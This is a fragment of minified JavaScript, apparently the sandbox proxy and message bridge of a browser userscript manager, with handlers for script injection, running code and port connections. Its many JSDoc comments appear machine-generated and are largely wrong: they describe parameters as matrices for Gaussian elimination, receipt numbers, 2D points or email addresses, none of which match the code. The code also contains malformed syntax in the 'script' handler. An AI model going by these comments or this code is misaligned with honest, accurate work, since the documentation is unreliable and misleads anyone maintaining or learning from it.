                             * @param { object } t - 3rd argument of the function, which is used to determine if
                             * the enumeration or value of the object is configurable and writable, and to set
                             * the default values for the `configurable`, `writable`, and `value` properties of
                             * the object.
                             * 
                             * @param { object } o - 3rd party object that the function operates on, and its
                             * values are used to determine the configurable and enumerable properties of the object.
                             * 
                             * @returns { boolean } a value of type boolean indicating whether the property was
                             * successfully defined or not.
                             */
                            defineProperty: (e,t,o)=>{
                                const {d: r, l: d} = i(t)
                                  , u = Gt(o);
                                return r && !r.configurable && (!!r.configurable != !!u.configurable || !!r.enumerable != !!r.enumerable) || a(t) ? (vt(d ? f : zn, t, u),
                                !1) : (vt(f, t, u),
                                l(t) && u && u.configurable && u.writable && u.value && "function" == typeof u.value && !p(u.value) && (u.value = Gt(u.value)),
                                l(t) && u && !u.configurable && "function" == typeof u.get && !p(u.get) && (u.get = Gt(u.get)),
                                l(t) && u && !u.configurable && "function" == typeof u.set && !p(u.set) && (u.set = Gt(u.set)),
                                delete s[t],
                                !0)
                            }
                            ,
                            /**
                             * @description 1) checks if an object has a property, 2) removes the property and
                             * its value from the object if it exists, 3) updates any references to the property
                             * within the object or its nested objects, and 4) returns a boolean indicating whether
                             * the property was deleted successfully.
                             * 
                             * @param { (primitive or not primitive value). } e - target object in which to look
                             * up and delete property values.
                             * 
                             * 		- `d`: A property that contains the delete operation result for the given `t`
                             * property. It is set to `true` if the property exists and can be deleted, and `false`
                             * otherwise.
                             * 		- `l`: A property that indicates whether the `t` property is an array or not.
                             * If `l` is `true`, then `t` is an array; otherwise, it is not.
                             * 		- `w`: A property that represents the delete operation result for any nested
                             * objects within the `t` property. It is set to `true` if any such object exists and
                             * can be deleted, and `false` otherwise.
                             * 		- `a`: A property that contains the original value of the `t` property before
                             * deletion. Its type is determined by the `configurable` property of the `t` property.
                             * If `a` is an object or array, its properties and methods are included in the delete
                             * operation result.
                             * 		- `f`: An optional property that contains a reference to the function that caused
                             * the delete operation to occur. This property is only present if the delete operation
                             * was triggered by a function call.
                             * 		- `o`: An optional property that contains a reference to the original object
                             * that contained the `t` property before any deletions occurred. This property is
                             * only present if any properties were deleted from the object during the delete operation.
                             * 
                             * 
                             * @param { object } t - variable or property being processed.
                             * 
                             * @returns { object } a boolean indicating whether the property exists in the target
                             * object.
                             */
                            deleteProperty: (e,t)=>{
                                let {d: a, l: d, w: u} = i(t);
                                return !(!a || !a.configurable) && (d && (d = delete f[t],
                                l(t) && d && "function" == typeof a && u && g(t, a)),
                                (u || (a = r[t]) && a.configurable) && (o === r && (r = mt(Gt({}), o)),
                                u = delete r[t]),
                                delete s[t],
                                d || u)
                            }
                            ,
                            /**
                             * @description retrieves and returns a value from a storage object. If the value is
                             * not found or is a promise, it calls a delegate function to retrieve the value,
                             * returning the result if successful.
                             * 
                             * @param { `void`   value, or null, returned by an optional `Gt` or `i` expression
                             * at runtime, as determined by the type coercion performed within the given `function`.
                             * } e - result of calling the `get()` method on an object passed as argument, and
                             * its value is returned if it's a function and has `function` as type.
                             * 
                             * 		- `o`: The serialized object obtained from the cache or database. If it's a
                             * dictionary (i.e., `o.type === 'object'`), then `o` is its deserialized form.
                             * Otherwise, it's an instance of the class `Object`.
                             * 		- `t`: The string identifier of the function.
                             * 		- `a`: The cached result from a previous execution of the `get` function. If
                             * present, `a` contains either the resolved promise or the already-resolved value
                             * of the function.
                             * 		- `s`: A cache object containing the state of the serialized objects. The key
                             * `t` corresponds to the value `o` inside `s`.
                             * 		- `zn`: An optional value that can be used as a parameter for the `d` property
                             * of the result, which is an instance of `Object`.
                             * 		- `Mt`: A promise returned by the `get` function. If present, it resolves to a
                             * value of type `Object`.
                             * 		- `i`: An optional value that can be used as a parameter for the `l` property
                             * of the result, which is an instance of `Boolean`.
                             * 
                             * 	If `o.bind` is defined, the return value is created by calling `o.bind(thisArg)`.
                             * The `thisArg` parameter is an object whose `value` property corresponds to the
                             * value of `e.binding`.
                             * 
                             * 
                             * @param { string } t - token of interest for which the function determines the value
                             * or gets it from another source.
                             * 
                             * @returns { `o.value`, if `o` has a `once` property and it's being deleted, or the
                             * return value of the `get` function if it exists. } a value or a promise of a value,
                             * depending on whether the object has a `get` method and whether it's bound to the
                             * context.
                             * 
                             * 		- `d`: The type of the return value, either "object" or "array".
                             * 		- `l`: A boolean indicating whether the return value is an empty object or array.
                             * 		- `value`: If present, represents the return value itself.
                             * 		- `get`: If present and a function, represents the getter method for the property.
                             * 		- `bind`: If present and a function, represents the bind method for the property.
                             */
                            get: (e,t)=>{
                                const o = s[t];
                                if (o) {
                                    if (o.once && delete s[t],
                                    "value"in o)
                                        return o.value;
                                    if (o.get)
                                        return o.get()
                                }
                                const {d: r} = a(t) ? Gt({
                                    d: Mt(zn, t),
                                    l: !1
                                }) : i(t);
                                if (r) {
                                    let e;
                                    const n = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                    return n && o && o.bind ? Gt(n) : n
                                }
                            }
                            ,
                            /**
                             * @description takes an object `o`, a property `t`, and a context `zn`. It returns
                             * an object containing the descriptor of the given property on the `o` object, with
                             * the descriptor's enumerable, configurable, writable, value, set, and get properties
                             * set to appropriate values.
                             * 
                             * @param { object } e - original value of the property being observed.
                             * 
                             * @param { object } t - object to which the get method should be applied.
                             * 
                             * @returns { object } an object containing information about a specified property
                             * on an object.
                             */
                            getOwnPropertyDescriptor: (e,t)=>{
                                let {d: o, l: r} = i(t);
                                if (!o) {
                                    const e = s[t];
                                    if (e)
                                        return Gt({
                                            enumerable: !0,
                                            configurable: !0,
                                            writable: !0,
                                            value: e.value,
                                            set: e.set,
                                            get: e.get
                                        });
                                    if (!a(t))
                                        return;
                                    o = Mt(zn, t),
                                    r = !1
                                }
                                const d = mt(Gt({}), o);
                                if (!r) {
                                    const e = d.get;
                                    e && (d.get = ()=>{
                                        const t = e();
                                        return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                    }
                                    ),
                                    d && !d.configurable && vt(f, t, d)
                                }
                                return d
                            }
                            ,
                            has: (e,t)=>t in f || t in s || t in r,
                            /**
                             * @description takes an object `r`, creates a new object `s`, and returns an array
                             * of unique property keys `n` that are present in both objects `r` and `s`.
                             * 
                             * @returns { array } an array of unique values.
                             */
                            ownKeys: ()=>{
                                const e = e=>!(e in r)
                                  , t = gt(r)
                                  , n = Ft(gt(ht(f)), e)
                                  , o = Gt({});
                                for (let e = 0; "Window" === Zt(Ot(zn, e)); e += 1)
                                    o[e] = !0;
                                const s = Ft(gt(o), e);
                                return qt(t, n, s)
                            }
                            ,
                            preventExtensions: ()=>!0,
                            /**
                             * @description modifies properties with write-protection and non-function setter/getter
                             * methods by calling `Gt` for values, and setting/getting them through their original
                             * functions.
                             * 
                             * @param { expression / value (indicated by the opening braces and the enclosed
                             * ternary expression inside them). } e - 12-ary function invoked upon each key's set
                             * method call.
                             * 
                             * 		- `s`: A mapping or an object with properties `t` and `o`. The value of `t` is
                             * either a string or an object reference, while the value of `o` is an object.
                             * 		- `i`: An inner function that returns an object containing `d`, which can be
                             * either an object or an empty value.
                             * 		- `a`: A boolean value indicating whether the deserialized input is an array.
                             * 		- `f`: A string value representing the serialization format of the input data.
                             * 		- `t`: The current property being processed, which is either a string or an
                             * object reference.
                             * 		- `o`: The current object being processed, which contains various properties and
                             * attributes.
                             * 		- `v`: A boolean value indicating whether the `t` property is an object reference.
                             * 		- `lt`: A boolean value indicating whether the `t` property is an array.
                             * 		- `p`: A boolean value indicating whether the input data can be changed or not.
                             * 
                             * 
                             * @param { object } t - property that needs to be updated
                             * 
                             * @param { object } o - object to be updated, and it is used to determine whether
                             * the setter function for a given property exists and is callable, as well as to
                             * update the property value if necessary.
                             * 
                             * @returns { boolean } an boolean value indicating whether the set operation was
                             * successful or not.
                             */
                            set: (e,t,o)=>{
                                const r = s[t];
                                if (r && r.set)
                                    return r.set(o),
                                    !0;
                                const {d} = i(t);
                                return !(d && !d.writable && !It(d, "set") || a(t) || (delete s[t],
                                vt(f, t, o),
                                l(t) && o && o.configurable && o.writable && o.value && "function" == typeof o.value && !p(o.value) && (o.value = Gt(o.value)),
                                l(t) && o && !o.configurable && "function" == typeof o.get && !p(o.get) && (o.get = Gt(o.get)),
                                l(t) && o && !o.configurable && "function" == typeof o.set && !p(o.set) && (o.set = Gt(o.set)),
                                0))
                            }
                        }));
                        return v
                    }
                }
                )({
                    sendPrefix: "2C",
                    listenPrefix: "2P"
                })),
                e.bridges.first = s;
                const c = mt(e.console, io);
                s.init(n);
                const d = Gt({});
                s.setMessageListener((({method: t, args: n})=>{
                    if ("commid" == t)
                        s.switchId(n.id),
                        s.send("ack", Gt({
                            id: n.id
                        }));
                    else if ("injectable" == t)
                        g(n.id, (()=>{
                            s.send("ack", Gt({
                                id: n.id
                            }))
                        }
                        )),
                        s.send("injectableack", Gt({
                            id: n.id
                        }));
                    else if ("setForeignAttr" == t)
                        zn[n.attr] = n.value;
                    else if ("script" == t) {
                        const {id: t, unwrap: r, bundle: a} = n
                          , {script = a.code
                          , {map: l, sourceMappingUrl: u} = a
                          , {url: g, version: p} = r;
                        try {
                            const t = io(g, p);
                            if (t) {
                                const {transpiledCode: r, sourceMappingUrl: a, map: l} = t;
                                s.send("ack", Gt({
                                    id: n.id
                                })),
                                s.send("scriptack", Gt({
                                    id: n.id,
                                    result: Gt({
                                        code: r,
                                        sourceMappingUrl: a,
                                        map: l
                                    })
                                }))
                            } else
                                s.send("ack", Gt({
                                    id: n.id
                                })),
                                s.send("scriptack", Gt({
                                    id: n.id,
                                    result: null
                                }))
                        } catch (e) {
                            s.send("ack", Gt({
                                id: n.id
                            })),
                            s.send("scriptack", Gt({
                                id: n.id,
                                error: Gt({
                                    message: e.message,
                                    stack: e.stack
                                })
                            }))
                        }
                    } else if ("port.message" == t) {
                        const {id: t, result: r} = n
                          , {type: a, data: l} = r;
                        "event" == a ? o.emit(t, l) : "promise" == a ? d[t] && (d[t](l),
                        delete d[t]) : "callback" == a && (d[t] && d[t](l),
                        delete d[t])
                    } else if ("external.connect" == t) {
                        const {id: t, port: r} = n
                          , {on: a, once: l, send: u, cleanup: g} = o.createProxy(r);
                        s.send("ack", Gt({
                            id: t
                        })),
                        s.send("external.connectack", Gt({
                            id: t
                        })),
                        s.send("port.message", Gt({
                            id: t,
                            result: Gt({
                                on: a,
                                once: l,
                                send: u,
                                cleanup: (()=>{
                                    g(),
                                    s.send("port.message", Gt({
                                        id: t,
                                        result: Gt(null)
                                    }))
                                }
                                )
                            })
                        }))
                    } else
                        "run" == t && (({id: t, code: r})=>{
                            try {
                                const a = io(null, null);
                                if (!a)
                                    return void s.send("ack", Gt({
                                        id: t
                                    }));
                                const l = new Un(a,vo);
                                l.once("ack", (()=>{
                                    const {send: a, once: u} = o.createProxy(l);
                                    u("result", (()=>{
                                        s.send("ack", Gt({
                                            id: t
                                        })),
                                        l.cleanup()
                                    }
                                    )),
                                    a("run", r)
                                }
                                )),
                                s.send("ack", Gt({
                                    id: t
                                }))
                            } catch (e) {
                                s.send("ack", Gt({
                                    id: t
                                })),
                                s.send("error", Gt({
                                    id: t,
                                    error: Gt({
                                        message: e.message,
                                        stack: e.stack
                                    })
                                }))
                            }
                        }
                        )(n)
                }
                )),
                o.once("cleanup", (()=>{
                    s.cleanup()
                }
                )),
                o.emit("ready"),
                {
                    /**
                     * @description is called on both `s` and `o`, indicating that both objects should
                     * have any resources they acquired during their lifetimes released.
                     */
                    cleanup: ()=>{
                        s.cleanup(),
                        o.cleanup()
                    }
                }
            }
            )(e.__proto__);
            const a = {
                createProxy: o=>c.createProxy(o)
            };
            return a
        }
        )(),
        i = (()=>{
            const n = {
                sendPrefix: "2P",
                listenPrefix: "2C"
            };
            return r ? r : (r = ((r = {
                bridges: {}
            })=>{
                /**
                 * @description creates a new message listener object `o` based on an optional input
                 * `e`, and returns that object. `o` has methods `send`, `once`, `setMessageListener`,
                 * and `cleanup`.
                 * 
                 * @returns { object } a new object with four methods: `send`, `once`, `setMessageListener`,
                 * and `cleanup`.
                 */
                const i = (({sendPrefix: t,listenPrefix: n})=>{
                    /**
                     * @description takes an optional `e` parameter and returns an object with send, once,
                     * setMessageListener, and cleanup methods, all of which take parameters from the
                     * original `t` argument.
                     * 
                     * @param { object } e - event object that contains data related to the message sent
                     * or received, and is used to determine which listener methods to call within the
                     * `n` function.
                     * 
                     * @param { object } t - 3rd-party library that defines the `Gt` method, which is
                     * being wrapped by the given function.
                     * 
                     * @returns { object } an object with methods for sending messages, listening to
                     * messages, and cleaning up listeners.
                     */
                    const o = ((e,t)=>{
                        const n = (t=>{
                            const o = Gt({});
                            return {
                                /**
                                 * @description sends a message to a specified receiver (r) with a given payload (i).
                                 * 
                                 * @param { object } r - 10-digit receipt number for which the GT request is being made.
                                 * 
                                 * @param { string } i - 2D point where to apply the geometric transformation to the
                                 * `r` input value.
                                 */
                                send: (r,i)=>{
                                    const s = Gt({
                                        m: r,
                                        a: i,
                                        r: null
                                    });
                                    e.send(t.sendPrefix, s)
                                }
                                ,
                                /**
                                 * @description adds an item to an array and then sets that array to its current
                                 * value, effectively replacing any previously set value for that key.
                                 * 
                                 * @param { array } r - 0-based index of an array element into which the function
                                 * pushes the value of the `i` input parameter.
                                 * 
                                 * @param { array } i - item to be added to the array `e[r]`.
                                 */
                                once: (r,i)=>{
                                    const s = (e[r] = e[r] || []);
                                    s.push(i)
                                }
                                ,
                                setMessageListener: e=>{
                                    o.sendPrefix = t.sendPrefix,
                                    o.listenPrefix = t.listenPrefix,
                                    o.listener = e
                                }
                                ,
                                /**
                                 * @description removes the `o.listener` property from the provided object, if it exists.
                                 */
                                cleanup: ()=>{
                                    o.listener && delete o.listener
                                }
                            }
                            ;
                            return t ? n(t) : o
                        }
                        )((e=>{
                            const o = {};
                            return e.send && (o.send = e.send),
                            e.once && (o.once = e.once),
                            e.setMessageListener && (o.setMessageListener = e.setMessageListener),
                            o
                        }
                        )(t));
                        return o
                    }
                    )((e=>{
                        const t = {};
                        return e.send && (t.send = e.send),
                        e.once && (t.once = e.once),
                        e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                        t
                    }
                    )(e));
                    let r = null;
                    /**
                     * @description creates an object `o` that provides message-related functionalities
                     * for an event emitter `e`. The object has methods `send`, `once`, `setMessageListener`,
                     * and `cleanup`. These methods allow the listener to send messages, subscribe to
                     * events once, set a message listener, and clean up.
                     * 
                     * @param { object } e - event that triggered the function and is passed as an argument
                     * to the `send`, `once`, `setMessageListener`, and `cleanup` methods.
                     * 
                     * @param { object } t - 3rd argument to the `Ht()` method and is used to update the
                     * `n` object's listeners when `t` is a message event.
                     * 
                     * @returns { object } an object with five properties: `send`, `once`, `setMessageListener`,
                     * `cleanup`.
                     */
                    const i = ((e,t)=>{
                        const n = Gt({});
                        Ht(gt(t), (t=>{
                            vt(n, t, Gt(e[t]))
                        }
                        ));
                        const o = {
                            /**
                             * @description takes an event `e` and a message `t`, creates a notification `r` with
                             * the message, and sends it to the server via `n`.
                             * 
                             * @param { electronic mail address (or an alias of such). } e - matrix to which the
                             * Gaussian elimination algorithm will be applied.
                             * 
                             * 		- `m`: The input message to be sent.
                             * 		- `a`: The attachment object containing the message's payload.
                             * 		- `r`: The receipt of the message.
                             * 
                             * 
                             * @param { email. } t - transformation of the matrix `m` that should be applied to
                             * the input data before sending it as a notification to the client.
                             * 
                             * 		- `m`: The message to be sent.
                             * 		- `a`: The attachment(s) to be sent along with the message.
                             * 		- `r`: A reference to the response object that will be populated with the result
                             * of sending the message.
                             * 
                             * 	In summary, the function takes in a payload `e` and a callback `t`, which contains
                             * the details of the message to be sent, including any attachments, and then sends
                             * the message using the `send` method of the `n` object.
                             */
                            send: (e,t)=>{
                                const r = Gt({
                                    m: e,
                                    a: t,
                                    r: null
                                });
                                n.send(t.sendPrefix, r)
                            }
                            ,
                            /**
                             * @description is called with two arguments: a event listener `t.listenPrefix` and
                             * a callback function `n`. The callback function will be executed once when the event
                             * occurs.
                             * 
                             * @param { event. } e - event that triggers the callback function when it occurs.
                             * 
                             * 		- `t`: The `t` parameter is an object that represents the event to listen for.
                             * It has a `listenPrefix` property that specifies the event prefix.
                             * 
                             * 
                             * @param { object } t - 3rd argument to `n.once()`, which sets the event listener
                             * for the given event on the `n` object.
                             */
                            once: (e,t)=>{
                                n.once(t.listenPrefix, (n=>{
                                    t.once(e, n)
                                }
                                ))
                            }
                            ,
                            setMessageListener: e=>{
                                n.setMessageListener((t=>{
                                    const o = t.m
                                      , r = t.a;
                                    "ack" === o ? e(null, r) : e({
                                        method: o,
                                        args: r
                                    })
                                }
                                ))
                            }
                            ,
                            /**
                             * @description is called, followed by any remaining expressions inside `r`.
                             */
                            cleanup: ()=>{
                                n.cleanup(),
                                r && r()
                            }
                        };
                        return o
                    }
                    )({
                        sendPrefix: e.sendPrefix,
                        listenPrefix: e.listenPrefix
                    }, o);
                    const s = {
                        /**
                         * @description dispatches an event `e` and any arguments `t` to any registered listeners.
                         * 
                         * @param { `Error`. } e - event that triggered the function.
                         * 
                         * 		- `e`: The input provided by the caller to be sent. Its structure is dependent
                         * on the type of the function's parameter.
                         * 
                         * 
                         * @param { `Error`. } t - 2nd value of an event object that is sent to the listener
                         * as part of the dispatching process.
                         * 
                         * 		- `e`: The serialized message that was sent to the server for processing.
                         */
                        send: (e,t)=>{
                            i.send(e, t)
                        }
                        ,
                        /**
                         * @description takes an event and a time, invoking the callback only once when the
                         * event occurs at or after the specified time.
                         * 
                         * @param { object } e - Event Object that triggered the function execution.
                         * 
                         * @param { integer } t - timestamp of the event being handled by the function.
                         */
                        once: (e,t)=>{
                            i.once(e, t)
                        }
                        ,
                        setMessageListener: e=>{
                            i.setMessageListener(e)
                        }
                        ,
                        /**
                         * @description removes any unnecessary objects and resources that were created during
                         * execution, ensuring efficient memory management and preventing potential issues
                         * in future runs.
                         */
                        cleanup: ()=>{
                            i.cleanup()
                        }
                    };
                    return s
                }
                )({
                    sendPrefix: n.sendPrefix,
                    listenPrefix: n.listenPrefix
                });
                let s = null;
                /**
                 * @description creates an object `r` with various methods for handling incoming
                 * messages in an WebSocket server. These methods include `send`, `once`,
                 * `setMessageListener`, and `cleanup`.
                 * 
                 * @param { unknown (as the input type isn't mentioned) } t - 3rd argument passed to
                 * the `Ht()` method, which is used to create a new listener object.
                 * 
                 * 		- `m`: The method being called, which is passed as an argument to the function.
                 * 		- `a`: An object containing attributes of the message being sent or received.
                 * 		- `r`: A reference to the original request or response, depending on whether it
                 * was already processed by the `t` object or not.
                 * 
                 * 	The `t` object itself has the following methods:
                 * 
                 * 		- `send()`: Sends a message to the server with the given `e` and `t` properties.
                 * 		- `once()`: Registers a callback function to be called once when a message of a
                 * specific type is received.
                 * 		- `setMessageListener()`: Sets a message listener that processes incoming messages.
                 * 		- `cleanup()`: Cleans up the `t` object and any related resources.
                 * 
                 * 
                 * @param { object } n - event loop, and it is used to handle events emitted by the
                 * server.
                 * 
                 * @returns { object } an object with methods for sending, once, setting a message
                 * listener, and cleaning up.
                 */
                const a = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        /**
                         * @description sends the notification to the `o.send` function. It takes two arguments:
                         * `n.sendPrefix`, which is a string value, and an anonymous object containing a `r`
                         * property that is set to null.
                         * 
                         * @param { object } e - 6-digit external ID of an order to be retrieved from the platform.
                         * 
                         * @param { object } t - timestamp for the generated ticket, which is then passed to
                         * the `o.send()` method as part of the prefix data for the ticket notification.
                         */
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        /**
                         * @description is called with an event listener and a callback function, attaching
                         * the callback to the event and ensuring it is only triggered once.
                         * 
                         * @param { object } e - event object that triggers the function's execution and
                         * passes it to the internal `once` method of the `t` variable for further processing.
                         * 
                         * @param { object } t - 3rd party event emitter that the function listens to for events.
                         */
                        once: (e,t)=>{
                            o.once(t.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        /**
                         * @description and `s` execution are sequenced together by the anonymous function.
                         */
                        cleanup: ()=>{
                            o.cleanup(),
                            s && s()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, o);
                const l = {
                    /**
                     * @description sends an error message or notification to the application's root
                     * component through its event bus.
                     * 
                     * @param { event. } e - event that is being handled by the function.
                     * 
                     * 		- `e`: A JavaScript object that has been deserialized from JSON data.
                     * 		- `t`: A JavaScript object representing the context in which the `send` function
                     * is being called.
                     * 
                     * 
                     * @param { `Error`. } t - 2nd event object to be processed by the function.
                     * 
                     * 		- `e`: The error object passed as an argument to the function. This can contain
                     * information about the error that occurred during serialization, such as the cause
                     * of the error and any additional data provided by the serializer.
                     */
                    send: (e,t)=>{
                        a.send(e, t)
                    }
                    ,
                    /**
                     * @description updates a property `a` with the given `event` and `time` arguments
                     * in a single-call event listener, preventing recursive listeners from being created.
                     * 
                     * @param { `Event`. } e - event to be listened to and passed to the `once()` method.
                     * 
                     * 		- Type: `e` is a `Function`.
                     * 		- Context: `e` represents a context or scope for which the function will be executed.
                     * 		- Time: `t` is a `time` parameter passed to the function, which specifies when
                     * the function should be executed.
                     * 
                     * 
                     * @param { Event. } t - 1st argument passed to the `once()` method when calling it
                     * with an event object and the current time.
                     * 
                     * 		- `e`: The event emitted by the internal `once` function upon invocation.
                     * 		- `t`: The deserialized input object containing information about the event.
                     */
                    once: (e,t)=>{
                        a.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
                        a.setMessageListener(e)
                    }
                    ,
                    /**
                     * @description clears any lingering objects and closures to free up memory, preventing
                     * accumulation of unnecessary data and promoting efficiency in the code.
                     */
                    cleanup: ()=>{
                        a.cleanup()
                    }
                };
                return l
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(e));
            return Gt({
                createProxy: e=>{
                    let t = r;
                    /**
                     * @description remembers event listener and functions attached to an element.
                     * 
                     * @param { Function. } e - 2nd argument passed to the ` mn()` function, which returns
                     * an array containing the modified event object and the original event object.
                     * 
                     * 		- `e` is an object that represents the deserialized input.
                     * 		- `mn()` method is used to extract the nested object from the input `e`.
                     * 		- The result of `mn()` is stored in the variable `n`.
                     * 		- The property `d` contains a reference to the function that listens for events
                     * on the target element `t`.
                     * 		- If the nested object `o` is present, it means that there is an event listener
                     * attached to `t`.
                     * 		- The `removeEventListener()` method is called with the name of the event `n`
                     * and the function reference `o` to detach the event listener.
                     * 		- The property `d[n]` is set to the result of calling the `Rt()` function with
                     * the target element `t`, the string `s`, and the original input `e`.
                     * 		- The `addEventListener()` method is called with the name of the event `n` and
                     * the new function reference `e` to attach a new event listener to `t`.
                     * 
                     * 
                     * @param { HTMLButtonElement in the given code snippet. } t - 3D object being processed
                     * and is used to manage its animation state.
                     * 
                     * 		- `t`: An object that contains a single property, `addEventListener`, which is
                     * a function that adds an event listener to the `window` object.
                     * 		- `s`: A string value that represents the type of the event to be listened for
                     * (e.g., "load", "unload", etc.).
                     * 		- `e`: An object that contains several properties, including:
                     * 		+ `removeEventListener`: a function that removes an event listener from the
                     * `window` object.
                     * 		+ `delete`: a method that deletes the property from an object (in this case, `d`).
                     * 		+ `typeof`: a function that returns a string indicating the type of the value
                     * passed to it (in this case, "function").
                     */
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r ? Gt(r) : r,
                            l: !!o,
                            w: !!n
                        })
                    }
                      , o = e=>{
                        if (!l(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , o = d[n];
                        if (o && (t.removeEventListener(n, o),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        /**
                         * @description modifies an object's properties by creating or modifying property
                         * descriptors and applying them to the object. It returns a value indicating whether
                         * the modification was successful.
                         * 
                         * @param { object } e - object to be documented.
                         * 
                         * @param { object } t - current property being processed in the function, which is
                         * used to determine whether the property is configurable and writable, and whether
                         * its value can be retrieved or modified.
                         * 
                         * @param { object } n - Object that contains the properties to be accessed and mutated.
                         * 
                         * @returns { object } a value that indicates whether a property exists and can be
                         * configured, set, or deleted.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , i = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!i.configurable || !!o.enumerable != !!o.enumerable) || o && a[t] || o && o.get && !o.set ? (vt(r ? a : s, t, i),
                            !1) : (vt(a, t, i),
                            l(t) && i && i.configurable && i.writable && i.value && "function" == typeof i.value && !p(i.value) && (i.value = Gt(i.value)),
                            l(t) && i && !i.configurable && "function" == typeof i.get && !p(i.get) && (i.get = Gt(i.get)),
                            l(t) && i && !i.configurable && "function" == typeof i.set && !p(i.set) && (i.set = Gt(i.set)),
                            delete r[t],
                            !0)
                        }
                        ,
                        /**
                         * @description removes property from objects, including nested ones, by checking if
                         * it exists and is configurable. If it does, it deletes the property and its value,
                         * recursively removing nested properties.
                         * 
                         * @param { object } e - object that contains the properties to be merged with the
                         * `a` object.
                         * 
                         * @param { object } t - 16-letter identifier of a property to be deleted from an
                         * object or array.
                         * 
                         * @returns { object } determined by whether the property exists and is configurable,
                         * removing it from the object and the global scope if applicable.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            l(t) && o && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description is a utility for retrieving values from an object.
                         * 
                         * @param { integer } e - 16th argument of the function, which is used to store the
                         * return value from the inner most block of the function, before it is returned.
                         * 
                         * @param { string } n - index of the property or method to be retrieved from an object.
                         * 
                         * @returns { `o`. } the value or function of a specified object property.
                         * 
                         * 		- If `o.once` is `true`, it indicates that the function returns only once for
                         * each invocation.
                         * 		- If `o.bind` is `function`, it means the function has a binding to a particular
                         * context.
                         * 		- If `o.get` is a function, it returns the result of calling the function with
                         * no arguments.
                         * 
                         * 	The properties of the output are as follows:
                         * 
                         * 		- If `o.value` is defined, it returns the value of the `get` function when called
                         * without arguments.
                         * 		- If `o.get` is a function and `r` is an object with a `value` property, it
                         * returns the result of calling `o.get()` on the object.
                         * 		- If `e` is defined and `It(r, "value")` is a function, it returns the result
                         * of calling `e()`.
                         * 		- If `o.bind` is `function`, it binds the context of the `get` function to the
                         * context of the invocation.
                         */
                        get: (e,n)=>{
                            const o = s[n];
                            if (o) {
                                if (o.once && delete s[n],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[n];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description sets own property descriptor on a given object with specified value
                         * and configuration, if it doesn't already exist. It also provides a getter method
                         * that returns an object's own properties protoChain.
                         * 
                         * @param { object } e - current value of the property at index `n` and is used to
                         * modify its configuration options when `a` is modified.
                         * 
                         * @param { number } n - 0-based index of an entry in the `a` object, which is used
                         * to access the corresponding entry in the `s` object and set its enumerable,
                         * configurable, writable, and value properties.
                         * 
                         * @returns { object } an object that contains the property descriptor of a specified
                         * property.
                         */
                        getOwnPropertyDescriptor: (e,n)=>{
                            let {d: o, l: r} = a[n];
                            if (!o) {
                                const e = s[n];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!l(n))
                                    return;
                                o = Nt(e, n),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = e.__proto__),
                                    Gt(t)
                                }
                                )
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        /**
                         * @description 1) initializes `e`, `t`, `n`, and `r` variables to some values 2)
                         * loops over an array of objects `Ot(a, e)`, and for each object 3) checks if the
                         * object has a key named "Window" by using `Zt(Ot(a, e))` 4) if the key is found,
                         * adds its value to the `r` array 5) returns an array of the keys found in the `r`
                         * array.
                         * 
                         * @returns { integer } an array of unique property names from the input object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in o)
                              , t = gt(o)
                              , n = Ft(gt(ht(s)), e)
                              , r = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                r[e] = !0;
                            const i = Ft(gt(r), e);
                            return qt(t, n, i)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description returns a value or undefined based on if the property exists and can
                         * be modified. If the property exists, it checks if it is writable and configurable,
                         * then sets the value to the provided option value if not.
                         * 
                         * @param { number } e - 4th argument of the function, which is the value to be set
                         * or retrieved from the object `s`.
                         * 
